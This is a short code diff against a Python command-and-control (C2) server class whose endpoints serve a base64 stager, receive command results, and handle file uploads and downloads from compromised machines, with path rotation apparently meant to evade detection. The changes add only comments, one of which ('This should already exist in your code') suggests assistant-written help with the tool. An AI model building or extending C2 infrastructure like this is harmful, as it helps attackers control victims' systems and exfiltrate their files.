@@ -33,7 +33,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             "stager_path": "/b64_stager",
             "cmd_result_path": "/command_result",
             "file_upload_path": "/file_upload",
-            "file_request_path": "/file_request"
+            "file_request_path": "/file_request"  # Added file_request_path
         }
         
         # Initialize path rotation
@@ -142,7 +142,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
             self._handle_file_upload()
         elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
-            self._handle_file_download()
+            self._handle_file_download()  # This should already exist in your code
         else:
             # Return a generic 200 response for unmatched paths
             self._handle_default()
